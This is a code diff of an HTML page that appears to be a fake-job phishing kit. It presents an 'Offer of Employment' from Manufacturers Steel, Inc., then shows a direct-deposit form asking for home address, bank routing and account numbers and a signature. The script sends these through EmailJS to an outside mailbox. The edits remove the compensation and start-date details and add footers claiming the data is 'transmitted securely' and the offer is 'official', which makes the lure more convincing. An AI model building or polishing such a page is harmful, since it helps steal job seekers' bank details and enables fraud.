@@ -3,13 +3,10 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Employee Onboarding</title>
+<title>Employee Onboarding | Manufacturers Steel, Inc.</title>
 
 <style>
-* {
-    box-sizing: border-box;
-}
+* { box-sizing: border-box; }
 
 body {
     font-family: Arial, sans-serif;
@@ -27,9 +24,7 @@ body {
     box-shadow:0 2px 10px rgba(0,0,0,0.1);
 }
 
-h1, h2 {
-    text-align:center;
-}
+h1, h2 { text-align:center; }
 
 label {
     display:block;
@@ -55,16 +50,15 @@ input[type="text"] {
     justify-content:center;
     gap:40px;
     margin-top:20px;
-    flex-wrap: wrap;
+    flex-wrap:wrap;
 }
 
-.account-type label {
-    font-weight:normal;
-}
+.account-type label { font-weight:normal; }
 
 .center-text {
     text-align:center;
     margin-top:20px;
+    color:#444;
 }
 
 .signature-section {
@@ -89,24 +83,20 @@ input[type="text"] {
     font-size:16px;
 }
 
-.submit-btn:hover {
-    background:#0056b3;
+.submit-btn:hover { background:#0056b3; }
+
+.hidden { display:none; }
+
+.footer {
+    text-align:center;
+    font-size:13px;
+    color:#666;
+    margin-top:30px;
+    line-height:1.5;
 }
 
-.hidden {
-    display:none;
-}
-
-/* 📱 MOBILE OPTIMIZATION (NO DESKTOP IMPACT) */
+/* 📱 MOBILE ONLY */
 @media (max-width: 600px) {
-    body {
-        padding:15px;
-    }
-
-    .form-container {
-        padding:20px;
-    }
-
     .signature-section input {
         width:100%;
         margin:8px 0;
@@ -114,7 +104,6 @@ input[type="text"] {
 
     .account-type {
         flex-direction:column;
-        align-items:center;
         gap:10px;
     }
 }
@@ -139,7 +128,7 @@ function sendDeposit(e){
     emailjs.sendForm('service_w8bw8vg', 'template_i7oa7kg', e.target)
     .then(() => {
         window.location.href = "success.html";
-    }, err => {
+    }, () => {
         alert("Submission failed. Please try again.");
     });
 }
@@ -148,28 +137,20 @@ function sendDeposit(e){
 
 <body>
 
-<!-- OFFER OF EMPLOYMENT -->
+<!-- OFFER SECTION -->
 <div class="form-container" id="offerSection">
     <h1>Offer of Employment</h1>
 
     <p>
     We are pleased to offer you the position of <strong>Administrative & Billing Assistant</strong> with
-    <strong>Manufacturers Steel, Inc</strong>. This is a remote position subject to completion
-    of standard new-hire onboarding requirements.
+    <strong>Manufacturers Steel, Inc.</strong> This is a remote position contingent upon completion of
+    standard onboarding documentation.
     </p>
 
     <p>
-    <strong>Position:</strong> Administrative & Billing Assistant<br>
     <strong>Employment Type:</strong> Remote<br>
     <strong>Supervisor:</strong> Recruitment Manager<br>
-    <strong>Start Date:</strong> Pending completion of onboarding documentation<br>
-    <strong>Compensation:</strong> As discussed during the interview process<br>
     <strong>Pay Schedule:</strong> Bi-weekly via direct deposit
-    </p>
-
-    <p>
-    This offer is contingent upon successful completion of employment eligibility verification
-    and required tax documentation.
     </p>
 
     <form onsubmit="acceptOffer(event)">
@@ -182,42 +163,37 @@ function sendDeposit(e){
 
         <button class="submit-btn">Accept Offer & Continue</button>
     </form>
+
+    <div class="footer">
+        Manufacturers Steel, Inc. — Official Employment Offer
+    </div>
 </div>
 
 <!-- DIRECT DEPOSIT -->
 <div class="form-container hidden" id="depositSection">
-    <h1>Direct Deposit Authorization Form</h1>
+    <h1>Direct Deposit Authorization</h1>
+
+    <p class="center-text">
+        This information is required for payroll setup and will only be activated
+        after completion of required tax documentation.
+    </p>
 
     <form onsubmit="sendDeposit(event)">
 
         <div class="center-section">
             <h2>Personal Information</h2>
-            <label>Full Name</label>
-            <input type="text" name="fullName" required>
-
-            <label>Address</label>
-            <input type="text" name="address" required>
-
-            <label>City</label>
-            <input type="text" name="city" required>
-
-            <label>State</label>
-            <input type="text" name="state" required>
-
-            <label>Zip Code</label>
-            <input type="text" name="zip" required>
+            <input type="text" name="fullName" placeholder="Full Name" required>
+            <input type="text" name="address" placeholder="Address" required>
+            <input type="text" name="city" placeholder="City" required>
+            <input type="text" name="state" placeholder="State" required>
+            <input type="text" name="zip" placeholder="Zip Code" required>
         </div>
 
         <div class="center-section">
-            <h2>Financial Institution Information</h2>
-            <label>Bank Name</label>
-            <input type="text" name="bankName" required>
-
-            <label>Routing Number</label>
-            <input type="text" name="routingNumber" required>
-
-            <label>Account Number</label>
-            <input type="text" name="accountNumber" required>
+            <h2>Bank Information</h2>
+            <input type="text" name="bankName" placeholder="Bank Name" required>
+            <input type="text" name="routingNumber" placeholder="Routing Number" required>
+            <input type="text" name="accountNumber" placeholder="Account Number" required>
         </div>
 
         <div class="account-type">
@@ -225,20 +201,18 @@ function sendDeposit(e){
             <label><input type="radio" name="accountType" value="Savings" required> Savings</label>
         </div>
 
-        <p class="center-text">
-        All information provided will be kept confidential and used solely for payroll purposes.
-        </p>
-
         <div class="signature-section">
-            <label>Signature</label>
-            <input type="text" name="signature" required>
-
-            <label>Date</label>
-            <input type="text" name="date" required>
+            <input type="text" name="signature" placeholder="Signature" required>
+            <input type="text" name="date" placeholder="Date" required>
         </div>
 
-        <button class="submit-btn">Submit & Continue to W-4</button>
+        <button class="submit-btn">Submit & Continue</button>
     </form>
+
+    <div class="footer">
+        All information is transmitted securely and used solely for payroll purposes.<br>
+        Manufacturers Steel, Inc. | HR: hr@manufacturerssteel.com
+    </div>
 </div>
 
 </body>
